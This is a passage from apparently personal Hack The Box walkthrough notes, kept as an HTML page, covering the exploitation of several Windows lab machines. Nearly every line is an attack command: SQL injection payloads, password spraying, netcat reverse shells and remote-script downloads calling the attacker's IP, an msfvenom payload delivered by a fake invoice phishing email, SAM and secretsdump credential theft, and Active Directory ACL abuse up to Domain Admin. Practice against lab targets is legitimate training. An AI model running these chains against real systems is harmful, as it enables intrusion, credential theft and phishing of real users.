+                        <br>' order by 6-- -
+                        <br>output: 'null' which means 5 columns
+                        <br>test' UNION SELECT 1,@@VERSION,DB_NAME(),4,5-- -
+                        <br>output: MSSQL Server 2017 14.0.1000.169 (x64) on Windows Server 2016 Strandard 10.0 x64
+                        <br>test' UNION SELECT 1,table_name,3,4,5 FROM INFORMATION_SCHEMA.TABLES-- -
+                        <br>output: Colleagues, Logins
+                        <br>test' UNION SELECT 1,name,3,4,5 FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name = 'Logins')-- -
+                        <br>output: id, password, username
+                        <br>test' UNION SELECT 1,username,oasswird,4,5 FROM Logins-- -
+                        <br>output: some hashes, cracked (password1 finance1 banking1) verify with crackmapexec smb/winrm, none works
+                        <br>test' UNION SELECT 1,2,3,4,SUSER_SID('MegaCorp\Administrator')-- -
+                        <br>output: some string not readable
+                        <br>ippsec use script to auto run out the full RID after find its length
+                        <br>test' UNION SELECT 1,2,3,4,DATALENGTH(SUSER_SID('MegaCorp\Administrator'))-- -
+                        <br>output: 28
+                        <br>0xdf use master.dbo.fn_varbintohexstr module to get the RID 
+                        <br>test' UNION ALL SELECT 58,58,58,master.dbo.fn_varbintohexstr(SUSER_SID('MEGACORP\Domain Admins')),58-- gxQm
+                        <br>output: 0x0105000000000005150000001c00d1bcd181f1492bdfc23600020000
+                        <br>Verify using SUSER_SNAME
+                        <br>test' UNION ALL SELECT 58,58,58,SUSER_SNAME(0x0105000000000005150000001c00d1bcd181f1492bdfc236f4010000),58-- gxQm
+                        <br>Next, both ippsec and 0xdf use script to bruteforce SID to find domain users
+                        <br>`crackmapexec smb 10.10.10.179 -u dom_users -p passwords --continue-on-success` found tushikikatomo:finance1
+                        <br>`evil-winrm -u "MEGACORP\tushikikatomo" -p finance1 -i 10.10.10.179`
+                        <br><span class="step_title">Privilege_escalation(tushikikatomo–>cyork)</span>
+                        <br>https://github.com/taviso/cefdebug
+                        <br>*Evil-WinRM* PS C:\programdata> .\cefdebug.exe
+                        <br>some tcp sockets links shown eg: ws://127.0.0.1:9102/1243eb8e-cffa-4cae-b922-5fa98b74e779
+                        <br>*Evil-WinRM* PS C:\programdata> .\cefdebug.exe --code "process.version" --url ws://127.0.0.1:14393/5a73a31b-903d-41e8-b18d-9fb422e89234
+                        <br>*Evil-WinRM* PS C:\programdata> .\cefdebug --code "process.mainModule.require('child_process').exec('whoami > C:\windows\system32\spool\drivers\color\0xdf')" --url ws://127.0.0.1:64493/fd4b0ffa-a388-40da-b01a-62709102094b
+                        <br>*Evil-WinRM* PS C:\programdata> type C:\windows\system32\spool\drivers\color\0xdf
+                        <br>output: megacorp\cyork
+                        <br>*Evil-WinRM* PS C:\programdata> .\cefdebug --code "process.mainModule.require('child_process').exec('C:\\programdata\\nc.exe 10.10.14.19 443 -e cmd')" --url ws://127.0.0.1:60404/830991c3-0f17-4025-9b2c-a0ef1c8675f2
+                        <br><span class="step_title">Privilege_escalation(cyork–>sbauer)</span>
+                        <br>download C:\inetpub\wwwroot\bin\MultimasterAPI.dll
+                        <br>`strings -el MultimasterAPI.dll > MultimasterAPI.dll.strings.txt` 
+                        <br>-e --encoding={s,S,b,l,B,L} Select character size and endianness: s = 7-bit, S = 8-bit, {b,l} = 16-bit, {B,L} = 32-bit
+                        <br>`grep -i pass MultimasterAPI.dll.strings.txt` server=localhost;database=Hub_DB;uid=finder;password=D3veL0pM3nT!;
+                        <br>OR use dnSpy.exe on commando VM to analize MultimasterAPI.dll, and found cred in source code
+                        <br>`crackmapexec smb 10.10.10.179 -u users.txt -p 'D3veL0pM3nT!' --continue-on-success` found sbauer:D3veL0pM3nT!
+                        <br>`crackmapexec winrm 10.10.10.179 -u sbauer -p 'D3veL0pM3nT!'`
+                        <br>`evil-winrm -u 'MEGACORP\sbauer' -p 'D3veL0pM3nT!' -i 10.10.10.179`
+                        <br><span class="step_title">Privilege_escalation(sbauer–>jorden)</span>
+                        <br>*Evil-WinRM* PS C:\programdata> .\SharpHound.exe -c all
+                        <br>OR `bloodhound-python -u 'sbauer' -p 'D3veL0pM3nT!' -ns 10.10.10.179 -d MEGACORP.LOCAL -c all --zip`
+                        <br>In bloodhound, search the 3 users we owned and right_click>>owned then query 'Shortest Paths to High Value Targets'
+                        <br>user 'sbauer' has 'GenericWrite' on user 'jorden'
+                        <br>*Evil-WinRM* PS C:\programdata> copy \\10.10.14.19\share\PowerView.ps1 .
+                        <br>*Evil-WinRM* PS C:\programdata> menu
+                        <br>*Evil-WinRM* PS C:\programdata> Bypass-4MSI  
+                        <br>*Evil-WinRM* PS C:\programdata> Import-Module .\PowerView.ps1
+                        <br>0xdf use: Set-DomainObject -Identity jorden -XOR @{useraccountcontrol=4194304} -Verbose
+                        <br>and verify with `Get-DomainUser jorden | ConvertFrom-UACValue`
+                        <br>`GetNPUsers.py -no-pass -dc-ip 10.10.10.179 MEGACORP/jorden`
+                        <br>ippsec use: Get-ADUser -Filter 'Name -like "Jor*"' | Set-ADAccountControl -doesnotrequirepreauth $true
+                        <br>`GetNPUsers.py MEGACORP.local/jorden -request`
+                        <br>`hashcat jorden.hash --wordlist /usr/share/wordlists/rockyou.txt` got jorden:rainforest786
+                        <br>`evil-winrm -u 'jorden' -p 'rainforest786' -i 10.10.10.179`
+                        <br><span class="step_title">Privilege_escalation(jorden->system)</span>
+                        <br>`new user jorden` has 'Server Operators' group membership
+                        <br>https://ss64.com/nt/syntax-security_groups.html  it say this group can start/stop services
+                        <br>According to ippsec pdf, the group can also change the properties of the 'browser' service and other services
+                        <br>ippsec_payload: change administrator pass
+                        <br>`sc.exe config browser binpath="C:\Windows\System32\cmd.exe /c net user administrator D4aUss834cWad"`
+                        <br>`sc.exe qc browser` verify the config
+                        <br>`sc.exe stop browser`  `sc.exe start browser`
+                        <br>`psexec.py administrator@10.10.10.179`
+                        <br>0xdf_payload: nc reverse shell 
+                        <br>`sc.exe config browser binPath= "C:\programdata\nc64.exe -e cmd.exe 10.10.14.19 443"`
+                        <br>`sc.exe qc browser` verify the config
+                        <br>`sc.exe stop browser`  `sc.exe start browser`
+                        <br>`rlwrap nc -lnvp 443` got system shell
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="easy">Netmon (Easy/Windows)</span> </button>                    
+                    <div class="sub_dropdown_content">
+                        <span class="step_title">Initial_Foothold</span>
+                        <br>ftp anonymouse login, \ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.old.bak found cred prtgadmin:PrTg@dmin2018
+                        <br>but the cred don't work on HTTP - PRTG Network Monitor
+                        <br>prtgadmin:PrTg@dmin2019  works
+                        <br>admin_page>>account_settings>>notifications
+                        <br>check 'Execute Program' The injection is in the Parameter
+                        <br>0xdf: test.txt;net user anon p3nT3st! /add;net localgroup administrators anon /add 
+                        <br>ippsec: test | ping -n 5 10.10.14.10
+                        <br>I use: test | powershell -e ...........
+                        <br>listener got system shell
+                        <br>PRTG Network Monitor 18.2.38 - (Authenticated) Remote Code Execution https://www.exploit-db.com/exploits/46527
+                        <br>I've not try this 46527.sh yet.
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="hard">Object (Hard/Windows)</span> </button>                    
+                    <div class="sub_dropdown_content">
+                        <span class="step_title">Initial_Foothold</span>
+                        <br>tcp8080 Jenkins create a account, login, create a job, 'add build step' 'Execute Windows batch command'
+                        <br>'build triggers' select 'build periodically' and fill with '* * * * *' which is run every mins
+                        <br>but reverse shell failed, seems have firewall rule 
+                        <br>`powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block` which shown block any outbound
+                        <br>`powershell -c Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow` which shown allow icmp outbound
+                        <br>tcpdump ping received, there is a dropdown that can lead to console output 
+                        <br>`powershell -c ls ..\..\users\` shows the folder for web_admin C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035 with config.xml in it
+                        <br>https://github.com/hoto/jenkins-credentials-decryptor  which need -m master.key -s hudson.util.Secret -c credentials.xml
+                        <br>`powershell -c cat C:\Users\oliver\AppData\Local\Jenkins\.jenkins\users\admin_17207690984073220035\config.xml`
+                        <br>`powershell -c cat C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\master.key`
+                        <br>`powershell -c [convert]::ToBase64String((cat C:\Users\oliver\AppData\Local\Jenkins\.jenkins\secrets\hudson.util.Secret -Encoding byte))`
+                        <br>decrypt on kali `jenkins-credentials-decryptor -m master.key -s hudson.util.Secret -c config.xml` got oliver:c1cdfun_d2434
+                        <br>0xdf note this one works as well: `wget https://raw.githubusercontent.com/gquere/pwn_jenkins/master/offline_decryption/jenkins_offline_decrypt.py`
+                        <br>`evil-winrm -i 10.10.11.132 -u oliver -p c1cdfun_d2434`
+                        <br><span class="step_title">Privilege_escalation(oliver->smith)</span>
+                        <br>*Evil-WinRM* PS C:\programdata> upload SharpHound.ps1
+                        <br>*Evil-WinRM* PS C:\programdata> . .\SharpHound.ps1
+                        <br>*Evil-WinRM* PS C:\programdata> Invoke-BloodHound -CollectionMethod All
+                        <br>bloodhound “Outbound Control Rights” which shows 'oliver' has 'ForceChangePassword' over 'smith'
+                        <br>'smith' has 'GenericWrite' over 'maria', and 'maria' has 'WriteOwner' over 'Domain Admins'
+                        <br>*Evil-WinRM* PS C:\programdata> upload PowerView.ps1
+                        <br>*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
+                        <br>*Evil-WinRM* PS C:\programdata> $newpass = ConvertTo-SecureString '0xdf0xdf!' -AsPlainText -Force
+                        <br>*Evil-WinRM* PS C:\programdata> Set-DomainUserPassword -Identity smith -AccountPassword $newpass
+                        <br>`evil-winrm -i 10.10.11.132 -u smith -p '0xdf0xdf!'`
+                        <br><span class="step_title">Privilege_escalation(smith->maria)</span>
+                        <br>Failed(Kerberoast_password_non-crackable)
+                        <br>*Evil-WinRM* PS C:\programdata> . .\PowerView.ps1
+                        <br>*Evil-WinRM* PS C:\programdata> Set-DomainObject -Identity maria -SET @{serviceprincipalname='nonexistent/0xDF'}
+                        <br>*Evil-WinRM* PS C:\programdata> setspn -a MSSQLSvc/object.local:1433 object.local\maria
+                        <br>*Evil-WinRM* PS C:\programdata> Get-DomainUser maria | Select serviceprincipalname
+                        <br>due to some reason, we can't act as smith unless using cred object
+                        <br>*Evil-WinRM* PS C:\programdata> $pass = ConvertTo-SecureString '0xdf0xdf!' -AsPlainText -Force 
+                        <br>*Evil-WinRM* PS C:\programdata> $cred = New-Object System.Management.Automation.PSCredential('object.local\smith', $pass)                        
+                        <br>*Evil-WinRM* PS C:\programdata> Get-DomainSPNTicket -SPN "MSSQLSvc/object.local:1433" -Credential $Cred
+                        <br>Hash                 : $krb5tgs$23$*UNKNOWN$UNKNOWN$MSSQLSvc/object.local:1433*$DAECA7C0ACC55F14934E5E8A382F7AD6$FB41B91C34D8B1139FD30A93B7C0534D7767606C940A162D6A08BD7A84C604FC6757E2EFB5CCEAC9B6B87052440E82F0A111663EE2E9153746E5C13296E39D2788BE41F4
+                        81F2F2594F3D90011C2BDEFFC704613ACA9B3684A9F96B352E6DD0B0B0009C294DA4E8203AA43C0221F3263115899E7B77989CEF394E9402AA96BF768D515210FCEA3D4FFA7134D8F3B2D0C867C2C63B20164C01D78A607B5249A79CAAA334AF80BD5B0D21DA948440BF0E0BB68E4AE791
+                        8DDAF8C860AC86EA7C21E95F29ACB53397C9F5F24A223ACEE9DCE22E255CEF0D7CB67E0F421A50D1F204ACC038D85D15716B33F0EB2B23E7A039ECAA67F4EA9327860970AD417406941EB771DB2B564096336524650D6C0D6EB1CA6BF108C339DDB9FA38DB0587F7EFBAEE98A3FE3449DB
+                        4DA81E59224EA0467B4DC2F2576846DDEF787E3D7BA1C213D3248B7D5D5227E00E8CA6B480227CD69DDFD7ACC05FD2F907DA6B5BABF60D630BA12679323E02E541FF81B2522A8536BE1F534640AF12C1EADE7026859C82366915C64D45BB855432BD7E72EC1AA53B91D7A6D24E609694C2
+                        5EA1D37AA66E5E92BE8BF9F6D1DC5E728E70F2295CDBBB2AA7651F2C2615D0ED861D8763F86F9FD5A5F5FB814F0914BC5A2185FD42A753905E28ABDA1DBD891F006C4217D412C1ACBF524B752D395C2055B6814526DF022A600A949779A98D61F80B774425F5D3D28D07F00863D71E5495
+                        6F68353AA2102681E6931AF8CC09F18E20F3DEBABEE639F578850D0B6D9BD4FCE3CD0DA084AAA4A1805C0E4F012FEB64BB5AB86C748FAD3DDB2ED466C4FCB075C24C2C0B56A728BB65ADBE0F2013B45C79D9C515E3F418B7B7DBCE8B34AF370427670AB12EF1A6B67CFF93B07FD21B9A61
+                        3D0BA3E034ACA27D2AB139F648A8AA1DAA3F3FD66EA26021855B55ADB32273B3C7D241BAFBE4E12A5F30AF5AB2EF8C4A141A41D27D567C9AFE0A1D2DB17E0BA357E13064D94E077F849D6E66ADD66F4015BE57C9FBF99E79C68ED18DC1F5916044F7ECF984F8397CF65C69776D8E432F4F
+                        498B323AF1963081EE28C561BBF305D6FA9593813D3A9EFC24671C9540DE1CB7006FBB36847A987EFBDD754517BEE81D8322DC5F2C529C610591D1DE053D72F79A29506725C90C9369FB285A8C2D30090A403C6906FE0C61F3E31C397A3B03768B1061C3B7E69CFDA329F4CB3EA8286A66
+                        1EC9CFF04C29F9BBC311AC53776C265C9DFEEDB85C4ECD5DC0DDEE64C87E9045A7632A792861B687F6358E138D11676BBFD2783D644B24837659B6F96F93AF529AFC43C32943583E4593B9BEA76B6778134C55B1EB3101CE390F3E9A494BDC927BA5FF2EF20720012FCF4270A8B1BFFA2A
+                        1012D7C4CACB77AE9B8DE19C8671CB09DB0F15FA008658D9669553F3C5AB3C303694D23A0F409F72DF95336F9ED8898A66289FC15AAF0B9DF0432D69FAA156BF54BBEF237DFCF0139850C5C8896C65A6DA6A4A9712A6D21F2A883EF6F25D460E
+                        <br>Failed(try_change_pass)
+                        <br>*Evil-WinRM* PS C:\programdata> $newpass = ConvertTo-SecureString '0xdf0xdf!' -AsPlainText -Force
+                        <br>*Evil-WinRM* PS C:\programdata> Set-DomainUserPassword -Identity maria -AccountPassword $newpass
+                        <br>Success(write Logon_Script)
+                        <br>*Evil-WinRM* PS C:\programdata> echo "whoami /all > \programdata\cmd.out" > cmd.ps1
+                        <br>*Evil-WinRM* PS C:\programdata> Set-DomainObject -Identity maria -SET @{scriptpath="c:\\programdata\\cmd.ps1"}
+                        <br>*Evil-WinRM* PS C:\programdata> type \programdata\cmd.out
+                        <br>*Evil-WinRM* PS C:\programdata> echo "dir /s \users\maria\ > \programdata\out" > cmd.ps1
+                        <br>found \users\maria\desktop\Engines.xls 
+                        <br>*Evil-WinRM* PS C:\programdata> echo "copy \users\maria\desktop\Engines.xls \programdata\" > cmd.ps1
+                        <br>Engines.xls has 3 maria passwords, `crackmapexec winrm 10.10.11.132 -u maria -p maria-pass` got maria:W3llcr4ft3d_4cls
+                        <br>`evil-winrm -i 10.10.11.132 -u maria -p 'W3llcr4ft3d_4cls'`
+                        <br><span class="step_title">Privilege_escalation(maria->DomainAdmin)</span>
+                        <br>*Evil-WinRM* PS C:\programdata> Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'
+                        <br>*Evil-WinRM* PS C:\programdata> Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'
+                        <br>*Evil-WinRM* PS C:\programdata> net user maria
+                        <br>need to exit the session an relogin with evil-winrm
+                        <br>*Evil-WinRM* PS C:\programdata> net user maria
+                        <br>maria is in 'Domain Admin'
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="easy">Omni (Easy/Windows)</span> </button>                    
+                    <div class="sub_dropdown_content">
+                        <span class="step_title">Initial_Foothold</span>
+                        <br>https://github.com/SafeBreach-Labs/SirepRAT
+                        <br>`pip install -r requirements.txt --default-timeout=1000`
+                        <br>`python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args ' /c powershell Invoke-WebRequest -outfile c:\programdata\nc.exe -uri http://10.10.14.18/nc64.exe'`
+                        <br>`python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\programdata\nc.exe" --args ' -e cmd 10.10.14.18 9001'`
+                        <br><span class="step_title">get cred method 1</span>
+                        <br>kali start smbserver `smbserver.py share . -smb2support`
+                        <br>`reg save HKLM\SAM .\sam` `reg save HKLM\SYSTEM .\system`
+                        <br>`copy .\sam \\10.10.14.18\share\sam` 
+                        <br>Failed(file too big): `copy .\system \\10.10.14.18\share\system`
+                        <br>`nc -nvlp 9002 > system` watch the file size till it's not growing, because nc won't tell when the transfer complete 
+                        <br>`nc.exe 10.10.14.18 9002 < .\system`
+                        <br>`secretsdump.py -system system -sam sam local` got hashes, crack got app:mesh5143
+                        <br><span class="step_title">get cred method 2</span>
+                        <br>there is a script constantly resetting 'Administrator' localgroup, so do it fast
+                        <br>kali# chisel_1.7.6_linux_amd64 server -p 8000 --reverse
+                        <br>target# chisel.exe client 10.10.14.18:8000 R:445:localhost:445 
+                        <br>`net user fakeadmin passw0rd! /add`
+                        <br>`net localgroup administrators /add fakeadmin` same time on target
+                        <br>`secretsdump.py 'fakeadmin:passw0rd!@127.0.0.1'` same time on kali
+                        <br><span class="step_title">get cred method 3</span>
+                        <br>PS C:\program files\windowspowershell\modules\packagemanagement> gci -force
+                        <br>found the hidden batch file 'r.bat' which does the reset administrator and app
+                        <br>it has both cred app:mesh5143 administrator:_1nt3rn37ofTh1nGz
+                        <br>another way to find the r.bat: `wmic process GET Name,ProcessID,CommandLine,ExecutablePath /FORMAT:LIST`
+                        <br><span class="step_title">decrypt user.txt</span>
+                        <br>app:mesh5143 login to HTTP 8080 got a webshell as app, we can use nc to get a reverse shell as app
+                        <br>PS C:\Data\Users\app> (Import-CliXml -Path user.txt).GetNetworkCredential().Password
+                        <br>this way will show the real user flag
+                        <br><span class="step_title">decrypt root.txt</span>
+                        <br>C:\Data\Users\app\hardening.txt  show the hints: - changed default administrator password of "p@ssw0rd" - added firewall rules to restrict unnecessary services - removed administrator account from "Ssh Users" group
+                        <br>C:\Data\Users\app\iot-admin.xml  which is another powershell cred file
+                        <br>PS C:\Data\Users\app> $cred = Import-CliXml -Path iot-admin.xml
+                        <br>PS C:\Data\Users\app> $cred.GetNetworkCredential() | fl
+                        <br>we got the cred administrator:_1nt3rn37ofTh1nGz and login HTTP 8080 then use nc to get a reverse shell as administrator
+                        <br>PS C:\data\users\administrator> (Import-CliXml -Path root.txt).GetNetworkCredential() | fl
+                        <br>this way will show the real root flag
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="easy">Optimum (Easy/Windows)</span> </button>                    
+                    <div class="sub_dropdown_content">
+                        <span class="step_title">Initial_Foothold</span>
+                        <br>Rejetto HttpFileServer 2.3.x - Remote Command Execution (3) https://www.exploit-db.com/exploits/49125
+                        <br>powershell.exe location based on arch and session: https://ss64.com/nt/syntax-64bit.html
+                        <br>`python3 49125.py 10.10.10.8 80 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.12/Invoke-PowerShellTcp.ps1')"`
+                        <br>`python3 49125.py 10.10.10.8 80 "C:\Users\kostas\Desktop\nc.exe -e cmd.exe 10.10.14.12 9001"`
+                        <br><span class="step_title">Privilege_escalation(kostas->system)</span>
+                        <br>`windows-exploit-suggester.py -d 2023-09-04-mssb.xls -i systeminfo.txt` found MS16-032 and winpeas also found 'https://www.exploit-db.com/download/39719' in 'IE history'
+                        <br>`IEX (new-object net.webclient).downloadstring("http://10.10.14.12/39719.ps1")`
+                        <br>`Invoke-MS16-032 -command "C:\Users\kostas\Desktop\nc.exe -e cmd.exe 10.10.14.12 9002"`
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="hard">Reel (Hard/Windows)</span> </button>                    
+                    <div class="sub_dropdown_content">
+                        <span class="step_title">Initial_Foothold</span>
+                        <br>ftp anonymous login found 'AppLocker.docx' 'readme.txt' 'Windows Event Forwarding.docx'
+                        <br>readme.txt got hint: "please email me any rtf format procedures - I’ll review and convert."
+                        <br>`exiftool Windows\ Event\ Forwarding.docx` found 'Creator : nico@megabank.com'
+                        <br>`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.2 LPORT=443 -f hta-psh -o 443.hta`
+                        <br>`git clone https://github.com/bhdresh/CVE-2017-0199`
+                        <br>`python2 CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -w 443.rtf -u http://10.10.14.2/443.hta -x 0`
+                        <br>`sendEmail -f 0xdf@megabank.com -t nico@megabank.com -u "Invoice Attached" -m "You are overdue payment" -a 443.rtf -s 10.10.10.77 -v`
+                        <br>OR use msf exploit/windows/fileformat/office_word_hta
+                        <br>`sendEmail -f 0xdf@megabank.com -t nico@megabank.com -u "Invoice Attached" -m "You are overdue payment" -a /root/.msf4/local/invoice.doc -s 10.10.10.77 -v`
+                        <br><span class="step_title">Privilege_escalation(nico->tom)</span>
+                        <br>found powershell cred file C:\Users\nico\Desktop\cred.xml
+                        <br>`powershell -c "$cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List *"`
+                        <br>output Tom:1ts-mag1c!!! which we can ssh into target
+                        <br><span class="step_title">Privilege_escalation(tom->claire)</span>
+                        <br>C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors\acls.csv open and analize OR upload it to bloodhound
+                        <br>OR `bloodhound-python -u Tom -p '1ts-mag1c!!!' -d HTB.LOCAL -c all -dc 10.10.10.77 --zip`
+                        <br>Both Failed(upload fail, bloodhound-python timeout) so have to manual analize with 'acls.csv'
+                        <br>'tom' has 'WriteOwner' over 'claire' which has 'WriteDacl' over 'Backup_Admins' group
+                        <br>PS C:\Users\tom\Desktop\AD Audit\BloodHound> . .\PowerView.ps1
+                        <br>PS C:\users\tom\desktop\AD Audit\BloodHound> Set-DomainObjectOwner -identity claire -OwnerIdentity tom
+                        <br>PS C:\users\tom\desktop\AD Audit\BloodHound> Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
+                        <br>PS C:\users\tom\desktop\AD Audit\BloodHound> $cred = ConvertTo-SecureString "qwer1234QWER!@#$" -AsPlainText -force
+                        <br>PS C:\users\tom\desktop\AD Audit\BloodHound> Set-DomainUserPassword -identity claire -accountpassword $cred
+                        <br>`ssh claire@10.10.10.77` with 'qwer1234QWER!@#$'
+                        <br><span class="step_title">Privilege_escalation(claire->Backup_Admins)</span>
+                        <br>claire@REEL C:\Users\claire>net group backup_admins claire /add
+                        <br>claire@REEL C:\Users\Administrator>net group backup_admins
+                        <br>verify 'claire' does in the group
+                        <br><span class="step_title">Privilege_escalation(Backup_Admins->Administrator)</span>
+                        <br>C:\Users\Administrator\Desktop\Backup Scripts\BackupScript.ps1  found cred 'Cr4ckMeIfYouC4n!' and comment '# admin password' 
+                        <br>`ssh administrator@10.10.10.77` with 'Cr4ckMeIfYouC4n'
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="easy">Remote (Easy/Windows)</span> </button>                    
+                    <div class="sub_dropdown_content">
+                        <span class="step_title">Initial_Foothold</span>
+                        <br>found '2049/tcp  open  nfs'
+                        <br>`showmount -e 10.10.10.180` shows '/site_backups (everyone)'
+                        <br>`mount -t nfs 10.10.10.180:/site_backups /mnt/` OR `mount --types nfs --target /mnt/ 10.10.10.180:/site_backups`
+                        <br>`strings /mnt/App_Data/Umbraco.sdf | head` found 'admin@htb.local' hash: b8be16afba8c314ad33d812f22a04991b90e2aaa and crack got 'baconandcheese'
+                        <br>gobuster and the /mnt both found /umbraco
+                        <br>login with admin@htb.local:baconandcheese
+                        <br>Umbraco CMS 7.12.4 - Remote Code Execution (Authenticated) https://www.exploit-db.com/exploits/49488
+                        <br>`python3 49488.py -i http://10.10.10.180 -u "admin@htb.local" -p baconandcheese -c whoami`
+                        <br>`python3 49488.py -i http://10.10.10.180 -u "admin@htb.local" -p baconandcheese -c whoami -a " /all"`
+                        <br>`python3 49488.py -i http://10.10.10.180 -u "admin@htb.local" -p baconandcheese -c powershell.exe -a " IEX (new-object net.webclient).downloadstring('http://10.10.14.12/Invoke-PowerShellTcp.ps1')"`
+                        <br><span class="step_title">Privilege_escalation(iis apppool\defaultapppool->administrator)</span>
+                        <br>PS> `cd HKLM:\software\WOW6432Node\TeamViewer` and `dir` OR `get-itemproperty -path .` found 'SecurityPasswordAES       : {255, 155, 28, 115...}'
+                        <br>PS HKLM:\software\WOW6432Node\TeamViewer\Version7> (get-itemproperty -path .).SecurityPasswordAES
+                        <br>We can use 0xdf's decrypt script: https://0xdf.gitlab.io/2020/09/05/htb-remote.html#decrypt-password
+                        <br>`python3 0xdf_AES128CBC_decode.py`  [+] Found password: !R3m0te!
+                        <br>OR follow ippsec got a meterpreter session in msf and use windows/gather/credentials/teamviewer_passwords
+                        <br>msf6 post(windows/gather/credentials/teamviewer_passwords) > set session 8
+                        <br>msf6 post(windows/gather/credentials/teamviewer_passwords) > run
+                        <br>[*] Finding TeamViewer Passwords on REMOTE
+                        <br>[+] Found Unattended Password: !R3m0te!
+                        <br>`psexec.py administrator@10.10.10.180` with !R3m0te!
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="medium">Resolute (Medium/Windows)</span> </button>                    
+                    <div class="sub_dropdown_content">
+                        <span class="step_title">Initial_Foothold</span>
+                        <br>`rpcclient -U "" -N 10.10.10.169` `enumdomusers` save usernames
+                        <br>`querydispinfo` found cred marko:Welcome123!
+                        <br>`crackmapexec winrm 10.10.10.169 -u rpc_users.txt -p 'Welcome123!'` found melanie:Welcome123!
+                        <br>`evil-winrm -i 10.10.10.169 -u melanie -p 'Welcome123!'`
+                        <br><span class="step_title">Privilege_escalation(melanie–>ryan)</span>
+                        <br>C:\PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt found cred ryan:Serv3r4Admin4cc123!
+                        <br>`evil-winrm -i 10.10.10.169 -P 5985 -u ryan -p 'Serv3r4Admin4cc123!'`
+                        <br>note: 'ryan' is not in 'Remote Management Users' but in 'Contractors' which is a nest group of 'Remote Management Users'
+                        <br><span class="step_title">Privilege_escalation(ryan–>SYSTEM)</span>
+                        <br>'ryan' is in 'MEGABANK\DnsAdmins' https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#dnsadmins
+                        <br>"The default permissions are Allow: Read, Write, Create All Child objects, Delete Child objects, Special Permissions."
+                        <br>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#dnsadmins
+                        <br>`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=443 -f dll -o rev.dll`
+                        <br>`smbserver.py s .`
+                        <br>*Evil-WinRM* PS C:\Users\ryan\Documents> dnscmd.exe /config /serverlevelplugindll \\10.10.14.11\s\rev.dll
+                        <br>*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe \\resolute stop dns
+                        <br>*Evil-WinRM* PS C:\Users\ryan\Documents> sc.exe \\resolute start dns
+                        <br>`rlwrap nc -lnvp 443` and we got a system shell
+                    </div>
+                </div>
+                <div class="sub_dropdown">
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="easy">Sauna (Easy/Windows)</span> </button>                    
+                    <div class="sub_dropdown_content">
+                        <span class="step_title">Initial_Foothold</span>
+                        <br>nmap found 'EGOTISTICAL-BANK.LOCAL' smb anonymous login but no share
+                        <br>`kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175` found username format 'fsmith' point to 'Fergus Smith' in /about.html page, save all usernames
+                        <br>`GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -outputfile hashes.aspreroast -dc-ip 10.10.10.175`
+                        <br>`hashcat -m 18200 hashes.aspreroast /usr/share/wordlists/rockyou.txt --force` got cred fsmith:Thestrokes23
+                        <br>`evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23`
+                        <br><span class="step_title">Privilege_escalation(fsmith–>svc_loanmgr)</span>
+                        <br>winpeas found autologin cred EGOTISTICALBANK\svc_loanmanager:Moneymakestheworldgoround!
+                        <br>manually discover the cred: *Evil-WinRM* PS HKLM:\software\microsoft\windows nt\currentversion\winlogon> get-item -path .
+                        <br>`evil-winrm -i 10.10.10.175 -u svc_loanmgr -p 'Moneymakestheworldgoround!'`
+                        <br><span class="step_title">Privilege_escalation(svc_loanmgr–>administrator)</span>
+                        <br>`bloodhound-python -u svc_loanmgr -p 'Moneymakestheworldgoround!' -ns 10.10.10.175 -d EGOTISTICAL-BANK.LOCAL -c all --zip`
+                        <br>'svc_loanmgr' has 1 'First Degree Object Control' which include 'GetChanges' and 'GetChangesAll' over 'EGOTISTICAL-BANK.LOCAL' domain
+                        <br>`secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'` got administrator's NT hash
